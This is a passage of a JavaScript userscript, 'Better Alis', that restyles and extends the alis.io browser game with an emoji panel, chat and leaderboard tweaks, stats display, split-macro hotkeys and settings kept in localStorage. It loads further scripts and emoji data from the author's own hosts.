//config
var v = "1.00"
var res = "https://zimek.tk/BetterAlis/res"

//loading upgrades data
$("#users").remove()
var getUsers = $.get(`https://raw.githubusercontent.com/thezou/bla/master/zouExt.users.json?nocache=${Math.random()}`);
var users = {}
var icons = {}
var emojis = []
var friends = {}
setTimeout(function(){
users = getUsers.responseJSON
icons = users.icons
emojis = users.emojis
}, 2000)
setTimeout(function(){
  var fr = $.getJSON('/api/friends?token=' + $("#jwt").val())
setTimeout(function(){
  fr=fr.responseJSON
  Object.keys(fr.friends).forEach(id => {eval(`$.extend(friends, {${id}:{"uid":${id}}})`)})
},1500)
},7000)

//hi
console.log("%cBetter Alis", "background: #222; color: #fff;font-family: 'Pattaya', sans-serif; padding-bottom: 20px;padding-top: 20px;padding-left: 60px;padding-right: 60px;font-size: 50px;border-radius: 100px;");

//==//Some Random CSS//==//
$("#chatroom").css("bottom", "30px");
$("#nick").css("border-radius", "15px");
$("#team_name").css("border-radius", "15px");
$("#hideui").css("width", "30px");
$("#input_box2").css("border-radius", "30px");
$("head").append('<style type="text/css"></style>');
$("#input_box2").css("width", "600px");
$("#input_box2").css("margin-left", "-50px");
$("#nick").addClass("inputzimek");
$("#team_name").addClass("inputzimek");
var newStyleElement = $("head").children(':last');
newStyleElement.html(".msg { color:#FFF; }");

$("div#ad_main").remove(); //Adblock
//==////==//


//==//chat features//==//

/*
<div id="chattools" class="unicodeEmojiContainer" style="width: 100%;width: 565px; margin-left: -40px;background-color: rgba(0,0,0,0.7);border: 1px solid #82fff8;padding: 5px 5px 5px 5px;margin-bottom: 5px;overflow: hidden;border-radius: 10px; display:block;>
<button id="chattoolsinfo" class="openpanel toolsBtn" style="width: auto;"><img width="30px" src="${res}/trash.png"> CLEAR CHATBOX:</button>
<button id="clearchat" class="openpanel toolsBtn" style="width: auto;">ALL</button>
<button id="clearserver" class="openpanel toolsBtn" style="padding-left: 3px;width: auto;">SERVER</button>
</div>
*/
$(`
<div id="btaEmojisBox">
<div class="unicodeEmojiContainer" style="width: 100%;width: 565px; margin-left: -40px;background-color: rgba(0,0,0,0.7);padding: 5px 5px 5px 5px;margin-bottom: 5px;overflow: hidden;border-radius: 7px; display:block;">
<div id="emojisBox" style="border-radius: 15px;margin-bottom:30px;">
<div id="defaultEmojis">
<span id="loadingEmojis">Loading...</span>
</div>
<br>
<div style="border-bottom: 1px solid white;margin-bottom:5px;">
<span style="font-size:20px;">Custom Emojis</span>
</div><br><div id="customEmojis"></div>

</div>
</div>
</div>
`).insertBefore("#input_box2");
$('#chatboxArea2').css({ "display": 'none', "flex-direction": 'column'});

setTimeout(function(){
  $("#loadingEmojis").remove()
  Object.values(emojis).forEach(emoji=>{
  if(emoji.type === "default"){
  var file = ".svg"
  if(emoji.id == 47 || emoji.id == 50)file=".png";
    $("#defaultEmojis").append(`
  <div class="unicodeemoji"><img title=':${emoji.name}:' onclick="addChat('${emoji.unicode}')" src="${res}/emojis/default/${emoji.id}${file}"></div>
      `)
  }

  if(emoji.type === "custom"){
    var style
    if(emoji.id == 8)style="margin-top:8px;";
    $("#customEmojis").append(`
  <div class="unicodeemoji"><img title=':${emoji.name}:' style="${style}" onclick="addChat(':${emoji.name}:')" src="${res}/emojis/custom/${emoji.name}.png"></div>
      `)
  }

  });
}, 3000)




//CSS
$(`<script src="https://apis.google.com/js/platform.js"></script>
<style>
#defaultEmojis{overflow-y: scroll}
#customEmojis{overflow-y: scroll}
.unicodeemoji {filter: grayscale(30%);float: left; width: 39.5px; padding: 1.5px; cursor: pointer;opacity: 0.8;transition-duration: 0.17s; }
.unicodeemoji:hover{filter: none;transition-duration: 0.3s;opacity: 1}
.unicodeEmojiContainer{opacity: 0.25;max-height: 39px;transition-duration: 0.5s}
.unicodeEmojiContainer:hover{opacity: 1;max-height:4000px;height:350px}
.openpanel:hover{background-color: #141414;border: 0px solid #161616;}
.openpanel{background-color: #212121;border: 0px solid #161616;}
.zimekremovebtn{background-color: #cc2222;border: 2px solid #ff3f3f;}
.zimekremovebtn:hover{background-color: #ff3f3f;border: 2px solid #ff3f3f;transition-duration: 0.17s;}
.overALL{background:#212121;border-radius:2px;display:none;height:555px;margin-left:15px;margin-right:-30px;padding:0;position:absolute;width:938px;z-index:300}
.mark{float: left;margin-top: 5px;padding-top: 10px;border-radius: 100px;border: 3px solid #ffa3e3;padding: 10px;font-family: 'Pattaya', sans-serif;color: #ffa3e3;font-size: 20px;}
.markbig{margin-left: 11%;width: 80%;text-align: center;margin-top: 40px;padding-top: 10px;border-radius: 100px;border: 3px solid #dbdbdb;padding: 10px;font-family: 'Pattaya', bold;color: #dbdbdb;font-size: 40px;}
.zimekclosebtn{float: left;height: 100%; width: 81px;background-color: #141414;border: 0px solid #161616;transition-duration: 0.2s;}
.zimekclosebtn:hover{float: left;height: 100%; width: 81px;background-color: #212121;border: 0px solid #161616;}
.zimekbtn:hover{background-color: #2d2d2d;border: 1px solid #afafaf;transition-duration: 0.17s;}
.zimekbtn{background-color: #161616;border: 0px solid #191919;}
#input_box2{border-bottom: 2px solid #cecece;height: 42px;}
.overLa{margin-top: 20%;background:#212121;border-radius:2px;display:none;height:298px;margin-left:30%;margin-right:-30px;padding:0;position:absolute;width:395px;z-index:1}
.inputzimek {border-bottom: 0px solid #d6d6d6;}
#chatroom{overflow-x: hidden;word-wrap: break-word;transition-duration: 0.21s;}
#chatboxArea2{transition-duration: 0.24s;}
.msg{font-size: 16px;}
.sender{font-size: 17px;}
.zimekbtn2{background-color: #141414;border: 0px solid #161616;transition-duration: 0.2s;}
.zimekbtn2:hover{background-color: #212121;border: 0px solid #161616;}
.emoji{margin-left: 2px;margin-right:2px;height:25px;margin-bottom:4px;}
#btaBackgroundShadow{background-image: url("${res}/bg-shadow.png");
  height: 500px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;}
#logomenu{background-image: url("${res}/menu-logo.png");
  width: 340px;height: 170px;margin-top: 60px;transition-duration: 0.5s;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;}
#logomenu:hover{width: 390px;height: 195px;margin-top: 45px;}
.zimekcheckbox{margin-top: -1px;}
.zimekbox{width: 27px;height: 27px;margin-top: 3px;}
  ::-webkit-scrollbar {
      width: 10px;
      background: rgba(25, 25, 25, 0.35);
      border-radius: 3px;
      opacity: 0.5;
  }
  ::-webkit-scrollbar-track {
      border-radius: 3x;
      background: transparent;
      opacity: 0.5;
  }
  ::-webkit-scrollbar-thumb {
      background: rgba(63, 165, 255, 0.35);
      border-radius: 100px;
      width: 70%;
      transition-duration: 0.3s
      opacity: 0.7;
  }
  ::-webkit-scrollbar-thumb:hover {
      background: rgba(109, 186, 255, 0.50);
      width: 98%;
      opacity: 0.85;
  }
  .niceNameEffect
  .little{height:30px;background-color:#151515;border-radius:4px;color:#d1d1d1;}
  .little:hover{cursor:pointer;background-color:#181818;color:white;}
#div_lb{transition-duration: 0.2s;}
.toolsBtn{width: 38px;height: 38px;cursor: pointer;opacity: 0.7;color: white;font-size: 15px;padding-left: 5px;padding-right: 5px;transition-duration: 0.2s;}
.toolsBtn:hover{opacity: 1;cursor: pointer;}
button{outline: none;}
#info{z-index:1;}
.zimeksettings{}
#btaEmojisPanelImg{filter: grayscale(80%);opacity: 0.5;transition-duration: 0.17s;}
#btaEmojisPanelImg:hover{filter: none;opacity: 1;transition-duration: 0.17s;}
.range{padding: 10px;}
.rest:hover{border: 2px solid red;}
.hotkey{width:50px;font-size:22px;background-color:#111111;border-radius:10px;text-align:center;color:#d1d1d1;border-bottom:none;height:25px;}
.font{font-family: Quicksand;}
.fontBTA{font-family: Pattaya;}
#btaRestartBtnImg{background-color: rgba(0,0,0,0.7);border-radius: 100px;padding: 5px;margin-top: -5px;margin-left: 3px;transition-duration: 0.2s;cursor: pointer;}
#btaRestartBtnImg:hover{border: 5px solid red;transition-duration: 0.2s;}
#zimekrestartwrite:hover{color: #ff4f4f;border: 3px solid #ff4f4f;}
.uk-card-title{transition-duration: 0.5s;}
#lb_title{transition-duration: 0.5s;}
#div_score{transition-duration: 0.5s;}
</style>
<link href="https://fonts.googleapis.com/css?family=Pattaya|Quicksand|Margarine" rel="stylesheet">
<script src="${res}/ftr.js?nocache=${Math.random()}"></script>
<script src="https://zimek.tk/BetterAlis/commands.js?nocache=${Math.random()}"></script>
`).appendTo('head');
//==////==//
$("h2#lb_title").addClass("betterlb");
$("#div_lb").addClass("betterlb1");
//==//HTML Things//==//
$(`
<div id="btaInfo" class="overALL" style="z-index: 600;">
<button class="zimekclosebtn" id="btaCloseInfo"><img src="${res}/symbols/back.png" width="60%"></button>
<div style="padding: 20px;margin-top: 15px;height: 85%; width: 90%;margin-left: 81px;overflow-y: scroll;border-radius: 15px;"">
<div style="float: left;width: 49%;">
<h4>Emojis commands</h4>
<h5>/shrug<br>/lenny<br>/lennu<br>/dance<br>/tableflip<br>/fight<br></h5><br>
<h4>Commands</h4>
<h5>/clear<br>/clear server</h5><br>
</div>
<div style="float: right;width: 49%;"><font size="5px">
<h4>Some features requires alis.io account</h4><br>
<h4>Some features are broken with multiboxing</h4><br>
<h4>If you have any ideas to extension tell me on discord (discord server is below)</h4><br>
<h3>Better alis is not compatible with Havis</h3><br>
</div></div>
<div style="margin-left: 81px;"><div style="max-height: 200px;">
<div style="margin-bottom: 30px;float: left;"><a href="https://discord.gg/jewrxwY" target="_blank"><img src="${res}/infopanel/discord.png" width="200px" height="68"></a></div>
<div class="mark"><b>Better Alis by Zimek</b></div>
<div style="float: left;margin-top: 10px;margin-left: 10px;"><div class="g-ytsubscribe" data-channelid="UCzQLS2sTAPAYH7qyj0FXP3w" data-layout="full" data-theme="dark" data-count="hidden"></div></div>
</div></div></div></div>
`).insertAfter("#settingsoverlays");

$(`
<div style="float: right;padding: 5px;margin-right: 60px;margin-top: 345px;display: none;" id="btaRestartBtnDiv"><div id="btaRestartBtnWrite" style="float: left;font-size: 20px;margin-top: 1px;padding: 2px;padding-left: 5px;display: none;padding-right: 5px;color: #ff2323;border: 3px solid red;"><b>RESTART</b></div>
<button onclick="return respawn(),!1" id="respawn1" style="position:absolute;background-color: transparent;border: 0px solid transparent;">
<img class="zimekrestart" id="btaRestartBtnImg" src="${res}/restart-btn.png" width="50px" height="50px"></button>
`).insertAfter("#div_lb");

$(`<div id="btaEmojisToggleDiv" style="margin-left: 504px;border-radius: 100px;"><button id="btaEmojisToggle" style="border-radius: 100px;position:absolute;background-color: transparent;border: 0px solid transparent;">
<img id="btaEmojisPanelImg" style="border-radius: 100px;margin-top: 0px;cursor: pointer;" src="${res}/emojis/default/1.svg" width="38px" height="38px"></button>`).insertBefore("#input_box2");
$('<div id="btaLogoStart" class="overLa" style="display: block;transition-duration: 0.2s;height: 298px;z-index:2;"><center><div id="logomenu"></div></center></div>').insertBefore("#settingsoverlays");
$(`<div id="btaSettings" class="overLa" style="margin-bottom: 500px;height: 430px;margin-top: 0px;margin-left: 284px;width: 400px;z-index: 200;">
<div style="height: 70px;width: 100%;">
<button id="hideall" class="zimekbtn2" style="width: 50%;height: 70px;"><img src="${res}/symbols/close.png" width="50px"></button>
<button id="infobtn" class="zimekbtn2" style="width: 50%;height: 70px;float:right;"><img src="${res}/symbols/info.png" width="50px"></button>
</div>
<div id="btaSettingsMain" style="width: 100%;max-height: 60%;float: left;margin-top: 0px;padding: 15px;">
<div><span style="font-size: 30px;" class="fontBTA">Better Alis</span><span style="font-size: 14px;margin-left: 10px;" class="font">by Zimek</span><span style="float: right;font-size: 10px;margin-top: 20px;" id="version" class="font"></span></div>
<div style="margin-top: 10px;overflow-y: scroll;max-height: 340px;">
Background color: <input id="btaBgColor" class="uk-input" type="color" style="border: 0px;padding: 0px;width: 30px;height: 30px;cursor: pointer;margin-bottom: 1px;margin-top:-3px;"><button id="defaultBg" class="little" style="margin-left:5px;margin-bottom:3px;height:26px;background-color:#151515;border-radius:4px;color:#d1d1d1;border:none;">default</button><br>
<label><input id="btaCCcell" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Custom Cell Color<input id="btaCellColor" class="uk-input" type="color" style="border: 0px;margin-top:-3px;padding: 0px;margin-left:5px;width: 30px;height: 30px;cursor: pointer;margin-bottom: 1px;"></label><br>
<label><input id="btaPskin" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Private Skin<input id="btaPrivSkin" placeholder="Private Skin URL" class="uk-input" style="border: 0px;padding: 0px;margin-left:5px;width: 150px;font-size:14px;background-color:#111111;color:white;height: 23px;cursor: pointer;margin-bottom: 1px;"></label><br>
<label><input id="btaHat" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Hat<input id="btaHatVal" placeholder="Hat URL" class="uk-input" style="border: 0px;padding: 0px;margin-left:5px;width: 150px;font-size:14px;background-color:#111111;color:white;height: 23px;cursor: pointer;margin-bottom: 1px;"></label><br>
<label><input id="btaLb" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Custom Leaderboard</label><br>
<label><input id="btaMention" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Name Mention</label><br>
<label><input id="btaFlight" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox"> Alis friends lighted messages</label><br>
<label><input id="btaChatFade" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Chatbox fade</label><br>
<label><input id="btaChatbox" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Custom Chatbox</label><br>
<label><input id="btaAutorespawn" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Auto respawn</label><br>
<label><input id="btaEmojis" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Emojis</label><br>
<label><input id="btaMsgTime" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Message Timelapse</label><br>
<label><input id="btaGameShadow" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Background shadow</label><br>
<label><input id="btaFbName" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Hide facebook name</label><br>
<label><input id="btaRestartBtn" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Restart button in game</label><br>
<label><input id="btaStats" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Ping and FPS</label><br>
<label><input id="btaHideOwnSkin" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Hide own skin</label><br>
<label><input id="btaDisableLBColors" class="uk-checkbox zimekbox zimekcheckbox" type="checkbox" style="margin-top: 3px;"> Disable lb colors</label><br><br>
Triple Split Macro: <input id="btaKeyTriple" maxlength="1" onkeyup="keyGay(this);" class="uk-input hotkey"><br>
x64 Split Macro: <input id="btaKey64" maxlength="1" onkeyup="keyGay(this);" class="uk-input hotkey"><br>
Pop-Split Macro: <input id="btaKeyPop" maxlength="1" onkeyup="keyGay(this);" class="uk-input hotkey"><br>
Pop-Split Macro Timeout: <input id="btaKeyPopTime" oninput="keyGay(this);" placeholder="185" max="999" min="100" type="number" class="uk-input hotkey" style="width:80px;">ms<br><br>
<div>
Score size: <input type="range" min="5" max="30" step="0.1" id="btaScoreSize" style="width: 150px;"><span style="margin-left: 5px;" id="btaScoreSizeVal"></span><br>
Chat text size: <input type="range" min="5" max="30" step="0.1" id="btaChatTextSize" style="width: 150px;"><span style="margin-left: 5px;" id="btaChatboxTextSizeVal"></span><br>
Costumize your chatbox: <span style="margin-left: 5px;"><span id="btaChatHeightVal"></span> x <span id="btaChatRightVal"></span><br>
<div style="margin-top: 60px;"><input type="range" min="100" max="520" id="btaChatHeight" style="width: 150px;margin-left:-50px;transform: rotate(-90deg);">
<input type="range" min="152" max="520" id="btaChatRight" style="width: 150px;margin-left:-80px;">
</div>
</div>
</div><br>
</div>`).insertBefore("#settingsoverlays");
$(`<li id="btaColorChangeTime"><a id="timechange"><p style="width: 250px;">Color change time</p><img width="25px" style="margin-left: 1px;" src="${res}/timer.png"></a></li>`).insertAfter("#openrankingli");
$(`<div id="btaBackgroundShadow" style="position:absolute;height: 100%;width: 100%;opacity: 1;display: none;"></div>`).insertBefore("#overlays");
$('<br><div style="margin-left: 10px;margin-top:17px;" id="btaStatsDiv"><span id="btaStatsPing">Ping: N/A</span><br><span id="btaStatsFPS">FPS: N/A</span></div>').insertAfter("#div_score");
//==////==//

//==//javascript//==//


//default settings
            $(function () {
                if (!localStorage.getItem("BetterAlisFirst")) {
                    localStorage.setItem("BetterAlis", JSON.stringify({
                    "hideownskin":false,
                    "autorespawn":false,
                    "shadow":false,
                    "cctrue":false,
                    "pskin":false,
                    "privskin":"",
                    "fbname":false,
                    "msgtime":true,
                    "restartbtn":false,
                    "OFFlbColors":false,
                    "stats":true,
                    "hat":false,
                    "hatval":"http://alis.io/assets/img/crownhat.png",
                    "chatfade":false,
                    "emojis":true,
                    "lb":true,
                    "flight":true,
                    "mention":true,
                    "chatbox":true,
                    "scoreSize":15,
                    "chatText":14,
                    "chatHeight":315,
                    "chatRight":350,
                    "hotkeys":{
                      "triple":"",
                      "split64":"",
                      "popsplit":"",
                      "poptime":"185",
                    },
                    "bgColor":`#212121`,
                    "cc":""
                  }));
                    localStorage.setItem("BetterAlisFirst", true);
                    window.location.reload(1);
                }
            });

const btaStorage = JSON.parse(localStorage.getItem("BetterAlis"));
function keyGay(x) {x.value = x.value.toLowerCase(); save()} //smh

//version
$("span#version").text(`v${v}`)

const defaultBg = document.getElementById('defaultBg');
const btaLb = document.getElementById('btaLb');
const btaChatFade = document.getElementById('btaChatFade');
const btaChatbox = document.getElementById('btaChatbox');
const btaEmojis = document.getElementById('btaEmojis');
const btaGameShadow = document.getElementById('btaGameShadow');
const btaFbName = document.getElementById('btaFbName');
const btaRestartBtn = document.getElementById('btaRestartBtn');
const btaStats = document.getElementById('btaStats');
const btaAutorespawn = document.getElementById('btaAutorespawn');
const btaPskin = document.getElementById('btaPskin');
const btaHideOwnSkin = document.getElementById('btaHideOwnSkin');
const btaDisableLBColors = document.getElementById('btaDisableLBColors');
const btaFlight = document.getElementById('btaFlight');
const btaMention = document.getElementById('btaMention');
const btaCCcell = document.getElementById('btaCCcell');
const btaMsgTime = document.getElementById('btaMsgTime');
const btaHat = document.getElementById('btaHat');
var btaHatVal = document.getElementById('btaHatVal');
var btaScoreSize = document.getElementById('btaScoreSize');
var btaChatTextSize = document.getElementById('btaChatTextSize');
var btaPrivSkin = document.getElementById('btaPrivSkin');
var btaChatHeight = document.getElementById('btaChatHeight');
var btaChatRight = document.getElementById('btaChatRight');
var btaBgColor = document.getElementById('btaBgColor');
var btaKeyTriple = document.getElementById('btaKeyTriple');
var btaKey64 = document.getElementById('btaKey64');
var btaKeyPop = document.getElementById('btaKeyPop');
var btaKeyPopTime = document.getElementById('btaKeyPopTime');
var btaCellColor = document.getElementById('btaCellColor');

//load values

if(!btaStorage.cc){
btaStorage.cc="#82e8ff"
}

if(!btaStorage.hatval)btaStorage.hatval="http://alis.io/assets/img/crownhat.png";

if(!btaStorage.pskin && !btaStorage.privskin){
btaStorage.pskin=false
btaStorage.privskin=""
}

if(!btaStorage.mention && !btaStorage.flight){
  btaStorage.mention=true
  btaStorage.flight=true
}

if(!btaStorage.hotkeys){
btaStorage.hotkeys={
  "triple":"",
  "split64":"",
  "popsplit":"",
  "poptime":"185",
}
}

if(btaStorage.hotkeys.poptime==="")btaStorage.hotkeys.poptime="185";

btaLb.checked = btaStorage.lb;
btaChatFade.checked = btaStorage.chatfade;
btaChatbox.checked = btaStorage.chatbox;
btaEmojis.checked = btaStorage.emojis;
btaGameShadow.checked = btaStorage.shadow;
btaFbName.checked = btaStorage.fbname;
btaRestartBtn.checked = btaStorage.restartbtn;
btaStats.checked = btaStorage.stats;
btaCCcell.checked = btaStorage.cctrue
btaAutorespawn.checked = btaStorage.autorespawn;
btaHideOwnSkin.checked = btaStorage.hideownskin;
btaDisableLBColors.checked = btaStorage.OFFlbColors;
btaMsgTime.checked = btaStorage.msgtime;
btaPskin.checked = btaStorage.pskin
btaHat.checked = btaStorage.hat
btaFlight.checked = btaStorage.flight
btaMention.checked = btaStorage.mention
btaPrivSkin.value = btaStorage.privskin
btaScoreSize.value = btaStorage.scoreSize;
btaHatVal.value = btaStorage.hatval
btaChatTextSize.value = btaStorage.chatText;
btaChatHeight.value = btaStorage.chatHeight;
btaChatRight.value = btaStorage.chatRight;
btaBgColor.value = btaStorage.bgColor;
btaCellColor.value = btaStorage.cc;
btaKeyTriple.value = btaStorage.hotkeys.triple;
btaKey64.value = btaStorage.hotkeys.split64;
btaKeyPop.value = btaStorage.hotkeys.popsplit;
btaKeyPopTime.value = btaStorage.hotkeys.poptime;



function save(){
  localStorage.setItem("BetterAlis", JSON.stringify({
  "hideownskin":btaHideOwnSkin.checked,
  "autorespawn":btaAutorespawn.checked,
  "shadow":btaGameShadow.checked,
  "fbname":btaFbName.checked,
  "restartbtn":btaRestartBtn.checked,
  "stats":btaStats.checked,
  "pskin":btaPskin.checked,
  "privskin":`${btaPrivSkin.value}`,
  "cctrue":btaCCcell.checked,
  "chatfade":btaChatFade.checked,
  "flight":btaFlight.checked,
  "mention":btaMention.checked,
  "emojis":btaEmojis.checked,
  "lb":btaLb.checked,
  "hat":btaHat.checked,
  "hatval":`${btaHatVal.value}`,
  "chatbox":btaChatbox.checked,
  "OFFlbColors":btaDisableLBColors.checked,
  "msgtime":btaMsgTime.checked,
  "scoreSize":btaScoreSize.value,
  "chatText":btaChatTextSize.value,
  "chatHeight":btaChatHeight.value,
  "chatRight":btaChatRight.value,
  "hotkeys":{
    "triple":`${btaKeyTriple.value}`,
    "split64":`${btaKey64.value}`,
    "popsplit":`${btaKeyPop.value}`,
    "poptime":`${btaKeyPopTime.value}`,
  },
  "bgColor":`${btaBgColor.value}`,
  "cc":`${btaCellColor.value}`
  }));
}

//input values to spans
$("#btaScoreSizeVal").text(`${btaStorage.scoreSize}px`);
$("#btaChatboxTextSizeVal").text(`${btaStorage.chatText}px`);
$("#btaChatHeightVal").text(`${btaStorage.chatHeight}px`);
$("#btaChatRightVal").text(`${btaStorage.chatRight}px`);

//load saved settings

if(btaPskin.checked){
  $("#btaPrivSkin").show()
} else {
  $("#btaPrivSkin").hide()
}

btaHat.onclick = function () {save()
  if(btaHat.checked){$("#btaHatVal").show()}else{
$("#btaHatVal").hide()}
}
btaHatVal.oninput = function () {save()}

if(btaHat.checked){$("#btaHatVal").show()}else{
$("#btaHatVal").hide()}


defaultBg.onclick = function () {
  $("html").css("background-color", `#212121`);
  btaBgColor.value = "#212121"
  save()
}

btaMention.onclick = function () {save()}
btaFlight.onclick = function () {save()}

btaPskin.onclick = function () {
  save()
  if(btaPskin.checked){
    $("#btaPrivSkin").show()
  } else {
    $("#btaPrivSkin").hide()
  }
}

var ccr = "0"
var ccg = "0"
var ccb = "0"
var btacc = "nan"

if(btaCCcell.checked == false){
  $("#btaCellColor").hide()
}

btaCCcell.onclick = function () {
  save()
  if(btaCCcell.checked){
    $("#btaCellColor").show()
  } else {
    $("#btaCellColor").hide()
  }
}

btaCellColor.oninput = function () {
  save()
  ccRGB(btaCellColor.value)
}

//bta chat text size
btaChatTextSize.oninput = function () {
save()
   $("#btaChatboxTextSizeVal").text(`${btaChatTextSize.value}px`);
   $(".msg, .sender, .time").css("font-size", `${btaChatTextSize.value}px`)
};

//bta score size
$("#div_score").css("font-size", `${btaStorage.scoreSize}px`);
btaScoreSize.oninput = function () {
save()
   $("#btaScoreSizeVal").text(`${btaScoreSize.value}px`);
   $("#div_score").css("font-size", `${btaScoreSize.value}px`)
};

if(btaDisableLBColors.checked){leaderboardTeamColorson = false}else{leaderboardTeamColorson = true}
btaDisableLBColors.onclick =  function () {
  save();
if(btaDisableLBColors.checked){leaderboardTeamColorson = false}else{leaderboardTeamColorson = true}
}
var antiseven = true
//bta stats
btaStats.onclick = function () {
  save()
    if (btaStats.checked) {
$("#btaStatsDiv").css("display", "block");
    } else {
$("#btaStatsDiv").css("display", "none");
}
};

if (btaStats.checked) {
$("#btaStatsDiv").css("display", "block");
} else {
$("#btaStatsDiv").css("display", "none");
}

setInterval(function(){
  window.sendChat("/ping");
  var ping = window.networkLatency + "ms";
  if(ping === "undefinedms"){ping="N/A"}
  $("#btaStatsPing").text(`Ping: ${ping}`);
}, 6000);
const times = [];
const refreshLoop = () => {
if (!$("#btaStatsFPS").length) return;
window.requestAnimationFrame(() => {
const now = performance.now();
while (times.length > 0 && times[0] <= now - 1000) times.shift();
times.push(now);
$("#btaStatsFPS").text(`FPS: ${times.length}`);
refreshLoop();
});
};
refreshLoop();

//hide own skin
var hideOwnSkinTrue
if(btaHideOwnSkin.checked){hideOwnSkinTrue = true}else{hideOwnSkinTrue = false}
btaHideOwnSkin.onclick = function () {
save()
    if (btaHideOwnSkin.checked) {
        hideOwnSkinTrue = true
    } else {
hideOwnSkinTrue = false
Object.values(playerDetails).forEach(player=>{if(player.uid==userid)player.skinUrl=document.getElementById("skinurl").value})
}
};

//bg color
  $("html").css("background-color", `${btaStorage.bgColor}`);
btaBgColor.oninput = function () {
save()
   $("html").css("background-color", `${btaBgColor.value}`);
};

//chat height
$("#chatroom").css("height", `${btaStorage.chatHeight}px`);
btaChatHeight.oninput = function () {
save()
   $("#btaChatHeightVal").text(`${btaChatHeight.value}`);
   $("#chatroom").css("height", `${btaChatHeight.value}px`)
};

//chat right
$("#chatroom").css("width", `${btaStorage.chatRight}px`);
btaChatRight.oninput = function () {
save()
   $("#btaChatRightVal").text(`${btaChatRight.value}px`);
   $("#chatroom").css("width", `${btaChatRight.value}px`)
};

//bta custom chatbox
btaChatbox.onclick = function () {
save()
    if (btaChatbox.checked) {
$("#chatroom").css("bottom", "40px")
$("#chatroom").css("border-radius", "10px 15px 15px 10px")
    } else {
$("#chatroom").css("bottom", "0px")
$("#chatroom").css("border-radius", "0px 0px 0px 0px")
}
};

if (btaChatbox.checked) {
$("#chatroom").css("bottom", "40px")
$("#chatroom").css("border-radius", "10px 15px 15px 10px")
} else {
$("#chatroom").css("bottom", "0px")
$("#chatroom").css("border-radius", "0px 0px 0px 0px")
}

//chat fade
btaChatFade.onclick = function () {
save()
    if (btaChatFade.checked) {
$("#chatroom").css("opacity", "0.7");
    } else {
$("#chatroom").css("opacity", "1");
}
};

if (btaChatFade.checked) {
$("#chatroom").css("opacity", "0.7");
} else {
$("#chatroom").css("opacity", "1");
}

$(document).ready(function(){
  $("#chatroom").hover(function(){
    $(this).css("opacity", "1");
    }, function(){
      $(this).css("opacity", `${btaChatFade.checked  ? "0.7" : "1"}`);
  });
});

$(document).ready(function(){
  $("#btaRestartBtnDiv").hover(function(){
    $("#btaRestartBtnWrite").fadeIn(200);
    }, function(){
    $("#btaRestartBtnWrite").fadeOut(200);
  });
});

//fb name
btaFbName.onclick = function () {
save()
    if (btaFbName.checked) {
$("h3.uk-card-title").css("filter", "blur(8px)");
    } else {
$("h3.uk-card-title").css("filter", "blur(0px)");
}
};

if (btaFbName.checked) {
$("h3.uk-card-title").css("filter", "blur(8px)");
} else {
$("h3.uk-card-title").css("filter", "blur(0px)");
}


if (btaRestartBtn.checked) {
$("#btaRestartBtnDiv").css("display", "block");
} else {
$("#btaRestartBtnDiv").css("display", "none");
}

btaRestartBtn.onclick = function () {
save()
if (btaRestartBtn.checked) {
$("#btaRestartBtnDiv").css("display", "block");
} else {
$("#btaRestartBtnDiv").css("display", "none");
}
};


btaLb.onclick = function () {
save()
    if (btaLb.checked) {
        $("h2#lb_title").css("text-align", "center");
        $("#div_lb").css("border-radius", "0px 0px 0px 20px");
        $("h2#lb_title").css("font-size", "25px");
        $("h2#lb_title").css("margin-top", "3px");
        $("h2#lb_title").css("margin-right", "1px");
    } else {
        $("h2#lb_title").css("text-align", "left");
        $("#div_lb").css("border-radius", "0px 0px 0px 0px");
        $("h2#lb_title").css("font-size", "20px");;
        $("h2#lb_title").css("margin-right", "0px");
        $("h2#lb_title").css("margin-top", "5px");
}
};

if (btaLb.checked) {
    $("h2#lb_title").css("text-align", "center");
    $("#div_lb").css("border-radius", "0px 0px 0px 20px");
    $("h2#lb_title").css("font-size", "25px");
    $("h2#lb_title").css("margin-top", "3px");
    $("h2#lb_title").css("margin-right", "1px");
} else {
    $("h2#lb_title").css("text-align", "left");
    $("#div_lb").css("border-radius", "0px 0px 0px 0px");
    $("h2#lb_title").css("font-size", "20px");;
    $("h2#lb_title").css("margin-right", "0px");
    $("h2#lb_title").css("margin-top", "5px");
}


btaGameShadow.onclick = function () {
save()
    if (btaGameShadow.checked) {
$("#btaBackgroundShadow").show();
    } else {
$("#btaBackgroundShadow").hide();
}
};

if (btaGameShadow.checked) {
$("#btaBackgroundShadow").show();
} else {
$("#btaBackgroundShadow").hide();
}

btaEmojis.onclick = function () {
save()
    if (btaEmojis.checked) {
$("#btaEmojisToggle").css("display", "block");
$("#btaEmojisBox").css("display", "block");
    } else {
$("#btaEmojisToggle").css("display", "none");
$("#btaEmojisBox").css("display", "none");
}
};

if (btaEmojis.checked) {
$("#btaEmojisToggle").css("display", "block");
$("#btaEmojisBox").css("display", "block");
} else {
$("#btaEmojisToggle").css("display", "none");
$("#btaEmojisBox").css("display", "none");
}


btaMsgTime.onclick = function () {
save()
if(btaMsgTime.checked){
  $("span.time").show();
}else{
  $("span.time").hide();
}
};

//fixing "SEASON #9"
let now2 = new Date();
let onejan2 = new Date(now2.getFullYear(), 0, 1);
week = Math.ceil( (((now2 - onejan2) / 86400000) + onejan2.getDay() + 1) / 7 );
$('#seasondates').html(now2.getFullYear() + ' Season #' + week);

$("#chatroom").show()
chatRoom.show = function() {
